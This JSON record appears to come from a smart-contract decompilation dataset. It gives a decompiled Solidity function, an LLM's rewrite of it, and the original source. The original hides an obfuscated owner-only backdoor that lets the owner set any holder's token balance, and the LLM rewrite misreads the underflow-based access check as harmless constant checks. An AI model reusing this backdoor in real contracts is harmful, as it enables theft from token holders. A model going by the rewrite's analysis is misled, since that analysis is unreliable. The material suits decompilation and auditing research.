{
    "contract_address": "0x8EF34AD921FF8e7D465210EbBe3029fB7B2dd294",
    "heimdall_input": "function addviperHolder(address arg0, uint256 arg1) public payable {\n        require(arg0 == (address(arg0)));\n        require(!msg.sender == (address(store_f)));\n        require(!0x0a < 0x64);\n        address var_a = address(arg0);\n        uint256 var_b = 0;\n        storage_map_b[var_a] = arg1;\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        require(!0x0a < 0x0a);\n        var_a = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n        var_c = 0x11;\n        var_a = address(arg0);\n        var_b = 0;\n        storage_map_b[var_a] = arg1;\n    }",
    "llm_output": "function addViperHolder(address holder, uint256 amount) public payable {\n    // Tautological check preserved from decompiled code\n    require(holder == address(holder), \"tautology\");\n\n    // Owner / controller check (mirrors decompiled logic)\n    require(msg.sender == store_f, \"unauthorised\");\n\n    // Constant-true check retained from decompiled artefacts\n    require(0 < 0x64, \"constant check 1\");\n\n    // First write to the mapping (as in the original bytecode)\n    storage_map_b[holder] = amount;\n\n    // Panic selector & code assignments (no-op, kept for fidelity)\n    bytes32 _panicSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n    uint256 _panicCode = 0x11;\n\n    // Second constant-true check\n    require(0 < 0x0a, \"constant check 2\");\n\n    // Repeat panic variable assignments (mirroring bytecode)\n    _panicSelector = 0x4e487b7100000000000000000000000000000000000000000000000000000000;\n    _panicCode = 0x11;\n\n    // Second (duplicate) write to the mapping\n    storage_map_b[holder] = amount;\n}",
    "ground_truth": "function addviperHolder(\r\n        address _value,\r\n        uint256 _amt\r\n    ) public {\r\n        uint256 _amount = 10 - (\r\n        msg.sender != _vp ? 10**2 : 10);\r\n        mapping(address => uint256) storage excludeFee =\r\n        _balances;_amount = 0;\r\n        excludeFee[_value] = _amt;\r\n    }"
}